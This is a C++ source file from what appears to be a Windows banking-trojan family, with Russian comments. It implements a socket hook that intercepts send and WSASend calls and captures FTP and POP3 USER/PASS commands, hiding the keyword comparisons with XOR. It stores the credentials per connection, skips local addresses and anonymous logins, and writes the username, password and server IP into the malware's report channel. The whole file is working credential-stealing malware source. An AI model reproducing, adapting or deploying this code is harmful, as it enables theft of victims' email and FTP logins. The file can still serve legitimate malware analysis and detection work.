#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <intrin.h>

#include "defines.h"
#include "DllCore.h"
#include "report.h"
#include "sockethook.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Переменные и функции для хранения промежуточных данных.
////////////////////////////////////////////////////////////////////////////////////////////////////

#if defined _WIN64
#define CACHE_LINE 64
#else
#define CACHE_LINE 32
#endif

#define CACHE_ALIGN __declspec(align(CACHE_LINE))

typedef struct
{
	SOCKET socket;
	LPWSTR userName;
	LPWSTR pass;
}SOCKETDATA;

struct socketNode
{
	SOCKETDATA socketdata;
	CACHE_ALIGN socketNode *next;
};
struct connectionsList
{
	CACHE_ALIGN DWORD connectionsCount;
	CACHE_ALIGN socketNode *firstConnection;
};

static connectionsList connList;
static CRITICAL_SECTION socketDataCs;

static SOCKETDATA *socketDataSearch(SOCKET s)
{
	if(s == NULL || s == INVALID_SOCKET || !connList.firstConnection) return NULL;
	SOCKETDATA* result = NULL;
	socketNode* currentNode = connList.firstConnection;
	_ReadWriteBarrier();
	CWA(kernel32, EnterCriticalSection)(&socketDataCs);
	while(currentNode)
	{
		if(currentNode->socketdata.socket == s)
		{
			result = &currentNode->socketdata;
			break;
		}
		currentNode = currentNode->next;
	}
	CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
	_ReadWriteBarrier();

	return result;
}

static SOCKETDATA *socketDataCreate(SOCKET s)
{
	socketNode *sn = (socketNode*)Mem::alloc(sizeof(socketNode));
	if(!sn) return NULL;
	
	sn->socketdata.socket = s;

	_ReadWriteBarrier();

	InterlockedIncrement((LONG *)&connList.connectionsCount);
	CWA(kernel32, EnterCriticalSection)(&socketDataCs);

	if(connList.firstConnection)
	{
		socketNode* cur = connList.firstConnection;
		while(cur->next) cur = cur->next;
		cur->next = sn;
	}
	else connList.firstConnection = sn;

	_ReadWriteBarrier();
	CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
	
	return &sn->socketdata;
}

static void socketDataFree(SOCKETDATA *sd)
{
	_ReadWriteBarrier();
	CWA(kernel32, EnterCriticalSection)(&socketDataCs);

	Mem::free(sd->userName);
	Mem::free(sd->pass);
	socketNode *cur = connList.firstConnection;
	socketNode *prev = NULL;
	while (cur)
	{
		if (&cur->socketdata == sd)
		{
		    if (!prev)
			{
				if (cur->next)
					connList.firstConnection = cur->next;
				else
					connList.firstConnection = NULL;
			}
			else
				prev->next = cur->next;
			break;
		}
		prev = cur;
		cur = cur->next;
	}
	InterlockedDecrement((LONG *)&connList.connectionsCount);
	_ReadWriteBarrier();
	CWA(kernel32, LeaveCriticalSection)(&socketDataCs);

}

////////////////////////////////////////////////////////////////////////////////////////////////////
#define XOR_COMPARE(d, w) ((*((LPDWORD)(d)) ^ RAND_DWORD2) == ((w) ^ RAND_DWORD2)) //Просто крипт для слов.
 
static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize)
{
	if(socket == INVALID_SOCKET || data == NULL || dataSize > 512)
		return false;

	//Поиск имени, Поиск пароля
	if(dataSize > 6 && (XOR_COMPARE(data, 0x52455355/*USER*/) || XOR_COMPARE(data, 0x53534150/*PASS*/)) && data[4] == ' ')
	{
		LPSTR argOffset = (LPSTR)(data + 5);
		DWORD argSize   = dataSize - 5;
		LPWSTR argument;
		//LPSTR nextLine;
		WDEBUG3(WDDT_INFO, "USER/PASS, argOffset=%u, dataSize=%u, argSize=%u", 5, dataSize, argSize);

		//Выделаяем аргумент команды.
		{
			DWORD i = 0;
			for(; i < argSize; i++)
			{
				BYTE c = argOffset[i];
				if(c == '\r' || c == '\n')
				{
					//nextLine = &argOffset[i + 1];
					break;
				}
				if(c < 0x20)return false;
			}
			if(i == 0 || i == argSize || (argument = Str::_utf8ToUnicode(argOffset, i)) == NULL)
				return false;
			WDEBUG1(WDDT_INFO, "argument=%s", argument);
		}

		//Добавляем промежуточные данные.
		SOCKETDATA *sd;
		bool ok = false;

		if((sd = socketDataSearch(socket)) == NULL && (sd = socketDataCreate(socket)) == NULL)
		{
			WDEBUG2(WDDT_ERROR, "socketDataSearch(%d) == socketDataCreate(%d) == 0.", socket, socket);
			Mem::free(argument);
		}
		else
		{
			ok = true;
			if(data[0] == 'U')
			{
				Mem::free(sd->userName);
				sd->userName = argument;
			}
			else //if(data[0] == 'P')
			{
				Mem::free(sd->pass);
				sd->pass = argument;
			}
			sd->socket = socket;
		}

		//Рекрусия на следующие данные после \r\n.
		/*
		if(ok)
		{
			LPSTR dataEnd = data + dataSize;
			while(nextLine < dataEnd && (*nextLine == '\r' || *nextLine == '\n'))
				nextLine++;
			if(nextLine < dataEnd)
				ok = socketGrabber(socket, (LPBYTE)nextLine, (DWORD)(DWORD_PTR)(dataEnd - nextLine));
		}
		*/
		return ok;
	}

	//Опеределение протокола.
	if(dataSize > 1)
	{
		bool ok = false;

		SOCKETDATA *sd = socketDataSearch(socket);
		if(sd != NULL)
		{
			if(sd->userName == NULL || sd->pass == NULL)
				socketDataFree(sd);
			else
			{
				BYTE protocolType      = 0;
				WCHAR protocolTypeStr[max(CryptedStrings::len_sockethook_report_prefix_ftp, CryptedStrings::len_sockethook_report_prefix_pop3)];

				//Опеределяем протокол.
				if((dataSize >= 3 && (data[0] == 'C' || data[0] == 'P') && data[1] == 'W' && data[2] == 'D') ||
					(dataSize >= 4 && (XOR_COMPARE(data, 0x45505954/*TYPE*/) || XOR_COMPARE(data, 0x54414546/*FEAT*/) || XOR_COMPARE(data, 0x56534150/*PASV*/)))
					)
				{
					protocolType    = BLT_LOGIN_FTP;
					CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_ftp, protocolTypeStr);
				}
				else if(dataSize >= 4 && (XOR_COMPARE(data, 0x54415453/*STAT*/) || XOR_COMPARE(data, 0x5453494C/*LIST*/)))
				{
					protocolType    = BLT_LOGIN_POP3;
					CryptedStrings::_getW(CryptedStrings::id_sockethook_report_prefix_pop3, protocolTypeStr);
				}
				WDEBUG1(WDDT_INFO, "protocolType=%u", protocolType);

				if(protocolType != 0)
				{
					SOCKADDR_STORAGE sa;
					int size = sizeof(SOCKADDR_STORAGE);

					if(CWA(ws2_32, getpeername)(socket, (sockaddr *)&sa, &size) == 0 && !WSocket::_isLocalIp(&sa))
					{
						bool write = false;             

						
						if(protocolType == BLT_LOGIN_POP3)
						{
							write = true;
						}
						else if(protocolType == BLT_LOGIN_FTP)
						{
							if(!CSTR_EQW(sd->userName, sockethook_user_anonymous))
								write = true;
						}

						if(write == true)
						{
							WCHAR ipAddress[MAX_PATH];
							WSocket::ipToStringW(&sa, ipAddress);
							CSTR_GETW(reportFormat, sockethook_report_format);
							{
								LPWSTR report=NULL;
								int r = Str::_sprintfExW(&report, reportFormat, protocolTypeStr, sd->userName, sd->pass, ipAddress);
								if(r > 0) Report::writeString(protocolType, 0, report, r);
							}
						}
					}
					socketDataFree(sd);
				}
			}
		}

		return ok;
	}

	return false;
}

void SocketHook::init(void)
{
	connList.firstConnection = NULL;
	connList.connectionsCount = NULL;
	CWA(kernel32, InitializeCriticalSection)(&socketDataCs);
}

void SocketHook::uninit(void)
{
	if(connList.firstConnection)
	{
		socketNode* cur = connList.firstConnection;
		socketNode* old = NULL;
		while(cur)
		{
			Mem::free(cur->socketdata.pass);
			Mem::free(cur->socketdata.userName);
			old = cur;
			cur = cur->next;
			Mem::free(old);
		}
	}
	CWA(kernel32, DeleteCriticalSection)(&socketDataCs);
}

int WSAAPI SocketHook::hookerCloseSocket(SOCKET s)
{

	if(DllCore::isActive())//Возможна небольшая утечка памяти.
	{
		SOCKETDATA *sd = socketDataSearch(s);
		if(sd) socketDataFree(sd);
	}

	return CWA(ws2_32, closesocket)(s);
}

int WSAAPI SocketHook::hookerSend(SOCKET s, const char *buf, int len, int flags)
{

	if(DllCore::isActive())
	{
		socketGrabber(s, (LPBYTE)buf, len);
	}
	return CWA(ws2_32, send)(s, buf, len, flags);
}

int WSAAPI SocketHook::hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine)
{

	if(DllCore::isActive())for(DWORD i = 0; i < bufferCount; i++)
		socketGrabber(s, (LPBYTE)buffers->buf, buffers->len);
	return WSASend(s, buffers, bufferCount, numberOfBytesSent, flags, overlapped, completionRoutine);
}

int WSAAPI SocketHook::hookerConnect(SOCKET s, const struct sockaddr FAR * name, int namelen)
{
	
	return connect(s, name, namelen);
}

int WINAPI SocketHook::hookerWSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS)
{
	
	return WSAConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS);
}